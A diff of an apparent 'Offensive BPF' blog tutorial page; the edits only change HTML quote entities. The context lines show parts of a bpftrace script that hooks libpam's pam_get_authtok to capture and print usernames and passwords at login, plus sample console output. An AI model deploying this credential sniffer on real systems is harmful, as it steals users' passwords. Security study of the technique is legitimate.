@@ -154,8 +154,8 @@
 </code></pre><p>Next, we create a <code>BEGIN</code> section to just show some information on the Console</p>
 <pre tabindex="0"><code>BEGIN 
 { 
-      printf(&quot;Welcome to Offensive BPF. Sniffing PAM authentications...&quot;);
-      printf(&quot;Ctrl-C to exit.\n\n&quot;);
+      printf(&#34;Welcome to Offensive BPF. Sniffing PAM authentications...&#34;);
+      printf(&#34;Ctrl-C to exit.\n\n&#34;);
 }
 </code></pre><h2 id="hooking-the-pam_get_authtok-function">Hooking the pam_get_authtok function</h2>
 <p>Now we create the core of the bpftrace program by hooking the <code>pam_getauthtok</code> call, reading the username and the password into a variable and printing them out once the function returns.</p>
@@ -169,7 +169,7 @@ uretprobe:/lib/x86_64-linux-gnu/libpam.so.0:pam_get_authtok
 /@user[tid]/ 
 {
   
-      printf(&quot;Program: %s, Username: %s, AuthTok: %s\n&quot;, 
+      printf(&#34;Program: %s, Username: %s, AuthTok: %s\n&#34;, 
              comm, //process
              str(@user[tid]),  
              str(*@authtok[tid])); 
@@ -184,7 +184,6 @@ uretprobe:/lib/x86_64-linux-gnu/libpam.so.0:pam_get_authtok
 <pre tabindex="0"><code>hacker@commodore:~$ sudo bpftrace tracepam.bt 
 Attaching 3 probes...
 Welcome to Offensive BPF. Sniffing PAM authentications...Ctrl-C to exit.
-
 </code></pre><p>Now, whenever someone logs on to the machine you will see username and authentication token:</p>
 <p><img src="/blog/images/2022/ebpf.pam.png" alt="pamsnoop"></p>
 <p>Quite useful when running across infrastructure that has <code>bpftrace</code> already installed.</p>
